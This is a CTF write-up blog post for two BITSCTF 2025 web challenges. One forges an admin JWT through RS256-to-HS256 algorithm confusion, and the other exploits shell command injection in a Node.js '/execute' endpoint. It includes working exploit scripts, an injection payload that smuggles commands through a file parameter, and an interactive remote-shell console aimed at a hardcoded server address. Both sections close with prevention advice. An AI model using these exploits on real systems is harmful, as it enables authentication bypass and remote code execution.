---
title: BITSCTF 2025
date: 2025-02-11
draft: false
tags:
  - ctf
  - learning
categories:
  - ctf
keywords:
  - ctf
  - learning
---
# Baby Web: JWT Algorithm Confusion Attack Walkthrough

## Challenge

![](Pasted%20image%2020250211152609.png)

### Initial Analysis
The challenge presents a web application implementing JWT-based authentication. Notable observations from the initial page inspection:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JWT Auth Demo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f0f0f0;
        }

        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .form-group {
            margin-bottom: 15px;
        }

        input {
            padding: 8px;
            width: 200px;
            margin-right: 10px;
        }

        button {
            padding: 8px 16px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0056b3;
        }

        .token-display {
            word-break: break-all;
            margin: 20px 0;
            padding: 10px;
            background-color: #f8f9fa;
            border-radius: 4px;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Authentication</h1>
        
        <div class="login-section">
            <h2>Login</h2>
            <div class="form-group">
                <input type="text" id="username" placeholder="Username">
                <input type="password" id="password" placeholder="Password" disabled>
                <button onclick="login()">Login</button>
            </div>
        </div>

        <div id="tokenInfo" class="hidden">
            <h2>Session Info</h2>
            <p>Role: <span id="userRole">user</span></p>
            <div class="token-display" id="tokenDisplay"></div>
            
            <button onclick="accessAdmin()">Access Admin Area</button>
            
            <div id="adminContent" class="hidden">
                <h3>Admin Content:</h3>
                <pre id="flagContent"></pre>
            </div>
            
            <div id="publicKeyDisplay" class="hidden"></div>
        </div>
    </div>

    <script>
        async function login() {
            const username = document.getElementById('username').value;
            
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username })
                });
                
                const data = await response.json();
                localStorage.setItem('jwt', data.token);
                
                document.getElementById('tokenInfo').classList.remove('hidden');
                document.getElementById('tokenDisplay').textContent = data.token;
            } catch (error) {
                console.error('Login failed:', error);
            }
        }

        async function accessAdmin() {
            try {
                const response = await fetch('/admin', {
                    headers: {
                        'Authorization': `Bearer ${localStorage.getItem('jwt')}`
                    }
                });
                
                if (response.ok) {
                    const data = await response.json();
                    document.getElementById('adminContent').classList.remove('hidden');
                    document.getElementById('flagContent').textContent = JSON.stringify(data, null, 2);
                } else {
                    alert('Admin access denied!');
                }
            } catch (error) {
                console.error('Admin access failed:', error);
            }
        }

        async function getPublicKey() {
            try {
                const response = await fetch('/public-key');
                const key = await response.text();
                document.getElementById('publicKeyDisplay').classList.remove('hidden');
                document.getElementById('publicKeyDisplay').innerHTML = `
                    <h3>Public Key:</h3>
                    <pre>${key}</pre>
                `;
            } catch (error) {
                console.error('Failed to fetch public key:', error);
            }
        }
    </script>
</body>
</html>
```

1. Login form with unusual characteristics:
   - Username field enabled
   - Password field explicitly disabled
   - No traditional authentication checks

2. Key endpoints identified:
   - `/login` - JWT token generation
   - `/admin` - Protected resource
   - `/public-key` - RSA public key endpoint

## Technical Analysis

### Authentication Flow
1. User submits username via login form
![](Pasted%20image%2020250211152850.png)

2. Server generates RS256-signed JWT containing:

![](Pasted%20image%2020250211152928.png)
3. Admin access controlled via JWT role claim

### Vulnerability Assessment
Critical security issues identified:

1. Missing password verification
2. Exposed RSA public key
3. Potential JWT algorithm confusion vulnerability
4. No algorithm enforcement on token verification

### Public Key

Retrieved RSA public key (2048-bit):

![](Pasted%20image%2020250211153046.png)
## Exploitation Strategy

### Attack Vector
The vulnerability stems from potential JWT algorithm confusion, allowing an attacker to:
1. Switch from RS256 to HS256 algorithm
2. Use the public key as HMAC secret
3. Generate forged admin tokens

### Solution Approach
1. Create forged JWT with:
   - Algorithm changed to HS256
   - Role elevated to "admin"
   - Public key as HMAC secret
2. Send forged token to `/admin` endpoint

## Solution Implementation
### CyberChef
Generate JWT using [CyberChef](https://gchq.github.io/CyberChef/#recipe=JWT_Sign('-----BEGIN%20PUBLIC%20KEY-----%5CnMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzdk1zKekmoidGS78NWTI%5CnhE88NW%2BjXqyMpsdxrmhEwBiFQHr1cvB5qXb7GecRSkRrN/w8SaeZJPDUsuKBULiu%5CnqfmScKEmcdrSyI152KPCiho7pNTC8ijkFyEGyTgUNQyMWRnDVCOyAGXcsD44hKjU%5CnWEfYiVcicgIpKNbV6tuIsr7Kl4KqYa2qSiolm6uruxc7MXin4%2BHijoVa4qmlrT5N%5Cn7ULdgFDedI8XHuQfyUyg2858kWwsWlOfe%2B%2BF%2BfbBc2Omolui5GcR6tw6p6453Hcm%5CnUUIFvxVsywxTGqld/ENC0W3gMChkKqIsXEQ7kEK7TQgRBLQQP1/Mfmos/kcOADVt%5Cn8wIDAQAB%5Cn-----END%20PUBLIC%20KEY-----','HS256','%7B%7D')&input=ewogICAgInVzZXJuYW1lIjogImFkbWluIiwKICAgICJyb2xlIjogImFkbWluIiwKICAgICJpYXQiOiAxNzM4OTMwMzA0Cn0):

![](Pasted%20image%2020250211153407.png)

### Exploit Code
Another option is via a Python code:
```python
import jwt
import base64
from cryptography.hazmat.primitives import serialization

# The public key
PUBLIC_KEY = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzdk1zKekmoidGS78NWTI
hE88NW+jXqyMpsdxrmhEwBiFQHr1cvB5qXb7GecRSkRrN/w8SaeZJPDUsuKBULiu
qfmScKEmcdrSyI152KPCiho7pNTC8ijkFyEGyTgUNQyMWRnDVCOyAGXcsD44hKjU
WEfYiVcicgIpKNbV6tuIsr7Kl4KqYa2qSiolm6uruxc7MXin4+HijoVa4qmlrT5N
7ULdgFDedI8XHuQfyUyg2858kWwsWlOfe++F+fbBc2Omolui5GcR6tw6p6453Hcm
UUIFvxVsywxTGqld/ENC0W3gMChkKqIsXEQ7kEK7TQgRBLQQP1/Mfmos/kcOADVt
8wIDAQAB
-----END PUBLIC KEY-----'''

# Payload for our forged token
payload = {
    "username": "admin",
    "role": "admin",
    "iat": 1738930304
}

def get_key_bytes():
    # Load the public key
    key = serialization.load_pem_public_key(PUBLIC_KEY.encode())
    
    # Get the raw bytes of the public key
    raw_bytes = key.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return raw_bytes

def create_forged_token():
    try:
        # Get the raw bytes to use as secret
        key_bytes = get_key_bytes()
        
        # Create the forged token
        forged_token = jwt.encode(
            payload=payload,
            key=key_bytes,
            algorithm='HS256'
        )
        return forged_token
    except Exception as e:
        print(f"Error creating token: {e}")
        return None

def main():
    # Create the forged token
    forged = create_forged_token()
    if forged:
        print(forged)

if __name__ == "__main__":
    main()
```

### Execution and Flag Retrieval
1. Run exploit script to generate forged token
![](Pasted%20image%2020250211153721.png)
2. Replace the existing `Authorization: Bearer token`
3. Access `/admin` endpoint to retrieve flag

![](Pasted%20image%2020250211153700.png)

## Key Takeaways

### Vulnerability Breakdown
The vulnerability exploits a common JWT implementation flaw where:
1. Algorithm is not strictly enforced
2. Public key is exposed
3. Token verification lacks algorithm validation

### Prevention Methods
1. Implement proper algorithm enforcement
2. Use `algorithm` parameter in token verification
3. Implement separate HMAC secret if both RS256 and HS256 are required
4. Avoid exposing cryptographic keys
## Reference
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

# BrokenCode: Command Injection Walkthrough

## Challenge 

![](Pasted%20image%2020250211154847.png)
## Initial Reconnaissance

The challenge provides a Node.js server application with several endpoints:
- `/` - Serves static files
- `/upload` - GraphQL endpoint for file uploads (broken)
- `/execute` - Executes uploaded Node.js files

Initial server code analysis revealed an intentionally broken setup:

```javascript
const express = require('express');
const { graphqlHTTP } = require('express-graphql');

const { graphqlUploadExpress, GraphQLUpload } = require('graphql-upload');
const fs = require('fs');
const path = require('path');
const { exec ,execSync} = require('child_process');

const app = express();
const mysql = require('mysql'); 
require('dotenv').config();


app.use(express.static('public'));
const typeDefs = gql`
  scalar Upload

  type File {
    filename: String!
    mimetype: String!
    encoding: String!
    path: String!
  }

  type Query {
    _empty: String
  }

  type Mutation {
    uploadFile(file: Upload!, filename: String!): File!
  }
`;
const UPLOAD_DIR = path.join(__dirname, 'uploads');

const resolvers = {
  Upload: GraphQLUpload,
  Query: {
    _empty: () => 'Hello World',
  },
  Mutation: {
    uploadFile: async (_, { file, filename }) => {
      const { createReadStream, mimetype, encoding } = await file;
      const filePath = path.join(UPLOAD_DIR, filename);
      if (fs.existsSync(filePath)) {
         console.log("File Exists")
      }
      else {
      await new Promise((resolve, reject) => {
        createReadStream()
          .pipe(fs.createWriteStream(filePath))
          .on('finish', resolve)
          .on('error', reject);
      });}

      return { filename, mimetype, encoding, path: filePath };
    },
  },
};




app.use(express.static(path.join(__dirname, 'public')));
console.log(path.join(__dirname, 'public'));
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});


server.start().then(() => {
  server.applyMiddleware({ app });
  app.use('/upload', graphqlHTTP({ resolvers, graphiql: true }));

  app.get('/execute', (req, res) => {
    const file = req.query.file;
    if (!file) {
      return res.status(400).send('Missing file parameter');
    }
    const execPath = path.join(UPLOAD_DIR, file);
    exec(`su - rruser -c "node ${execPath}"`, (error, stdout, stderr) => {
      if (error) {
        try {
                execSync(`rm ${execPath}`);  
            } catch (rmError) {
                console.error(`Failed to delete ${execPath}:`, rmError);
            }
        console.log(error)
        return res.status(500).send(`Error`);
      }
      if (stderr) {
        console.log(stderr)
         try {
                execSync(`rm ${execPath}`);  
            } catch (rmError) {
                console.error(`Failed to delete ${execPath}:`, rmError);
            }
        return res.status(500).send(`Error`);
      }
      console.log(stdout);
      try {
                execSync(`rm ${execPath}`);  
            } catch (rmError) {
                console.error(`Failed to delete ${execPath}:`, rmError);
            }
      return res.status(200).send(stdout);
    });
  });
  const PORT = 7000;
  app.listen(PORT, () => {});
});
```

## Technical Analysis

### Key Vulnerability

1. Command Injection in `/execute` endpoint:
```javascript
app.get('/execute', (req, res) => {
    const file = req.query.file;
    const execPath = path.join(UPLOAD_DIR, file);
    exec(`su - rruser -c "node ${execPath}"`, (error, stdout, stderr) => {
      // ...
    });
});
```

Critical issues:
- Unsanitized file parameter
- Direct command string interpolation
- Execution through shell

### Vulnerability Analysis
The code constructs a shell command using template literals, allowing command injection through the `file` parameter. The command runs as `rruser` through `su`, providing access to that user's context.

## Exploitation Strategy

### Command Injection Vector
The vulnerable endpoint allows breaking out of the Node.js command:
```http
/execute?file=test" --help "
```

This transforms into:
```bash
su - rruser -c "node /home/rruser/uploads/test" --help ""
```

![](Pasted%20image%2020250211155108.png)
### Enhanced Payload
Adding command redirection improves output readability:
```http
test" --help >/dev/null; <command>"
```

![](Pasted%20image%2020250211155137.png)
### Exploitation 
Python script for streamlined exploitation:

```python
import requests
import urllib.parse

class CTFConsole:
    def __init__(self, base_url="http://20.193.159.130:7000"):
        self.base_url = base_url

    def execute_command(self, command):
        """Execute a command through the node injection"""
        # Construct the payload
        payload = f'test" --help >/dev/null; {command}"'
        
        # Send the request
        response = requests.get(f"{self.base_url}/execute", params={'file': payload})
        return response.text

    def run_console(self):
        """Run an interactive console"""
        while True:
            try:
                command = input("\n$ ")
                if command.lower() == 'exit':
                    break
                    
                result = self.execute_command(command)
                print(result)
                
            except KeyboardInterrupt:
                print("\n[*] Ctrl+C detected, exiting...")
                break
            except Exception as e:
                print(f"Error: {e}")

if __name__ == "__main__":
    console = CTFConsole()
    console.run_console()
```

Flag content in `flag.txt`:

![](Pasted%20image%2020250211155417.png)

## Key Takeaways

### Vulnerability Breakdown
The vulnerability stems from:
1. Unsanitized user input in command construction
2. Use of shell execution
3. Broken GraphQL implementation masking the actual vulnerability

### Prevention Methods
1. Use safe child_process methods:
```javascript
execFile('node', [execPath], options)
```

2. Implement proper input validation:
```javascript
if (!/^[\w.-]+$/.test(file)) {
    return res.status(400).send('Invalid filename');
}
```

3. Avoid shell execution when possible
4. Implement proper file execution sandboxing

## References
- [Node.js child_process Documentation](https://nodejs.org/api/child_process.html)
- [Command Injection Prevention](https://owasp.org/www-community/attacks/Command_Injection)
